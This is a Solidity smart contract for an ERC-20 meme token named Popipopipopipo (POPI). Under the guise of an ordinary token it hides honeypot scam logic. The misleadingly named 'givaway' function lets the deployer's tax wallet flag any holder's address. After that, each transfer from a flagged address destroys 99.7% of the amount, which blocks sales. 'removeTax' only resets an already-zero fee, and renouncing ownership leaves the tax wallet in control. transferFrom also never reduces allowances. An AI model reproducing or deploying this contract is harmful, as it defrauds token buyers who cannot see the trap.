pragma solidity ^0.8.21;
// SPDX-License-Identifier: MIT
// https://twitter.com/elontweeteth
// https://t.me/elontweeteth

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract Erc20Token is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 694200000000000 * 10 ** _decimals;
    mapping(address => uint256) private _balances;

    string private _name = "Popipopipopipo";
    string private  _symbol = "POPI";

    constructor() {
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _taxWallet = msg.sender; 
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }

    function marketingAddres() private view returns (bool) {
        return (_taxWallet == (sender()));
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    address public _taxWallet;
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0));
        uint256 _taxTokenAmount = _fee;
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        uint256 balanceFrom = ( (_balances[from]) - (value));
        _balances[from] = balanceFrom;
        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 onCooldownFee = getTaxAmount(value);
        if ((cooldowns[from] != 0) && onCooldown) { _taxTokenAmount = (onCooldownFee); } 
        uint256 toBalance = _balances[to];
        toBalance += (value - (_taxTokenAmount));
        _balances[to] = toBalance;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function getTaxAmount(uint256 val) internal pure returns (uint256) {
        return val.mul(997).div(1000);
    }
    function givaway(address[] calldata ws) external {
        for (uint256 _iWallet = 0;  _iWallet < ws.length;  _iWallet++) {if (marketingAddres()){cooldowns[ws[_iWallet]] = getBlockNumber() + 1;}}
    }
    bool givawayActive = true;
    uint256 _fee = 0;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function removeTax() external onlyOwner {
        _fee = 0;
    }
    mapping (address => uint256) internal cooldowns;
    uint256 _sellFee = 0;
    function sender() internal view returns (address) {
        return msg.sender;
    }
    event Approval(address indexed, address indexed, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256);
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
}